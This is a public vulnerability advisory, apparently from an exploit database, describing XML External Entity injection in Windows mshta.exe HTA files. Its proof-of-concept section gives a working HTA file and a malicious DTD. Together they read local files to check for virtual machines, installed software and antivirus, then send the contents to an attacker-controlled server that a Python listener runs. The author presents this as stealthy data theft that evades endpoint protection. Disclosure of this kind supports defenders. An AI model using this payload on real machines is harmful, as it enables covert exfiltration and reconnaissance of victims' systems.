@@ -1,0 +1,130 @@
+# Exploit Title: Microsoft Windows mshta.exe 2019 - XML External Entity Injection
+# Date: 2020-07-07
+# Exploit Author: hyp3rlinx
+# Vendor homepage: https://www.microsofft.com/
+# CVE: N/A
+
+
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-MSHTA-HTA-FILE-XML-EXTERNAL-ENTITY-INJECTION.txt
+[+] twitter.com/hyp3rlinx
+[+] ISR: ApparitionSec     
+ 
+
+[Vendor]
+www.microsoft.com
+
+
+[Product]
+Windows MSHTA.EXE .HTA File
+
+
+An HTML Application (HTA) is a Microsoft Windows program whose source code consists of HTML, Dynamic HTML, and one or more
+scripting languages supported by Internet Explorer, such as VBScript or JScript. The HTML is used to generate the
+user interface, and the scripting language is used for the program logic. An HTA executes without the constraints
+of the internet browser security model; in fact, it executes as a "fully trusted" application.
+
+
+[Vulnerability Type]
+XML External Entity Injection
+
+
+[Impact]
+Information disclosure, Recon
+
+
+[CVE Reference]
+N/A
+
+
+[Security Issue]
+Windows mshta.exe allows processing of XML External Entitys, this can result in local data-theft and or program reconnaissance upon opening
+specially crafted HTA files. From an attacker perspective, since we are not dependent on scripting languages like Javascript, VBScript or
+WScript.Shell, we may have better chances at subverting endpoint protection systems as we are only using XML markup.
+
+HTA exploits found online typically show code execution, with reliance on ActiveX Objects and scripting engines and hence are more
+easily detected by security products. Many of these exploits also use payload obfuscation techniques for stealth. However, I found nothing
+publicly documented that leverages XML injection targeting the mshta.exe HTA file-type.
+
+Yea I know, no code execution. However, we get stealthy data theft with recon capabilities. Armed with this info, we can more accurately
+target potential software vulnerabilities at a later date from info gathering a systems program installations. Usually, this type of recon
+is seen in first-stage malware infections using the Windows CreateToolhelp32Snapshot API.
+
+Therefore, since theres no documented HTA exploits using XXE attacks for this file type, I release the advisory.
+Successfully tested on Windows 10 and Windows Servers 2016, 2019.
+
+
+[Exploit/POC]
+Multi program recon and check if running in a Virtual Machine all in a single HTA file, change IP accordingly.
+
+1) "Doit.hta"
+
+<?xml version="1.0"?>
+<!-- VMware check -->
+<xml>
+<!DOCTYPE xxe4u [ 
+<!ENTITY % file SYSTEM "C:\ProgramData\VMware\VMware Tools\manifest.txt">
+<!ENTITY % dtd SYSTEM "http://127.0.0.1:8000/datatears.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+</xml>
+
+<!-- Notepad++ install check -->
+<xml>
+<!DOCTYPE xxe4u [ 
+<!ENTITY % file SYSTEM "C:\Program Files (x86)\Notepad++\change.log">
+<!ENTITY % dtd SYSTEM "http://127.0.0.1:8000/datatears.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+</xml>
+
+<!-- McAfee AV install check -->
+<xml>
+<!DOCTYPE xxe4u [ 
+<!ENTITY % file SYSTEM "C:\ProgramData\McAfee\MCLOGS\VSCoreVersionInfo.txt">
+<!ENTITY % dtd SYSTEM "http://127.0.0.1:8000/datatears.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+</xml>
+<HTA:APPLICATION WINDOWSTATE="minimize" />
+
+
+2) The "datatears.dtd" DTD file hosted on attackers server.
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:8000?%file;'>">
+%all;
+
+
+3) Local Python v3 web-server listening on port 8000 to receive victims info.
+
+python -m http.server 
+ 
+
+[POC Video URL]
+https://www.youtube.com/watch?v=XaTrBEu4Ghw
+
+
+[Network Access]
+Remote
+
+
+[Severity]
+High
+
+
+[Disclosure Timeline]
+MSHTA .HTA files are classified untrusted, many threats already well known.
+July 4, 2020 : Public Disclosure
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
